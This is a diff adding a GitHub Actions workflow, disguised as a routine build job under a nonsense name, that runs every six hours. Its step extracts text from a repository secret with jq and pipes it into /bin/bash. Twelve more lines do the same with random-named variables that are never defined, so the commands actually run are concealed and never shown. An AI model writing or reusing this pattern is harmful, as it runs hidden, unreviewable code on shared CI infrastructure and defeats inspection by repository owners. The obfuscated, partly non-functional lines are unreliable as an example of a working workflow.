@@ -1,0 +1,30 @@
+name: houtiantomorroew
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: houtiantomorroew
+        env:
+          lm27: ${{ secrets.lm27 }}
+        run: |
+          echo $lm27 | jq -r .aih65136 | /bin/bash
+          echo $o807 | jq -r .bh072 | /bin/bash
+          echo $qedec7 | jq -r .nf8 | /bin/bash
+          echo $uw3405 | jq -r .j40 | /bin/bash
+          echo $jct75306 | jq -r .vti477 | /bin/bash
+          echo $ik6296 | jq -r .n53664 | /bin/bash
+          echo $iott7546 | jq -r .nbp3231 | /bin/bash
+          echo $i48 | jq -r .hfyk5992 | /bin/bash
+          echo $cxxsi378 | jq -r .mhb3 | /bin/bash
+          echo $dx7 | jq -r .qqpys4 | /bin/bash
+          echo $ht2995 | jq -r .eaabv41365 | /bin/bash
+          echo $jnacx7876 | jq -r .pqsb63 | /bin/bash
+          echo $hjrd10409 | jq -r .hdv3053 | /bin/bash
+
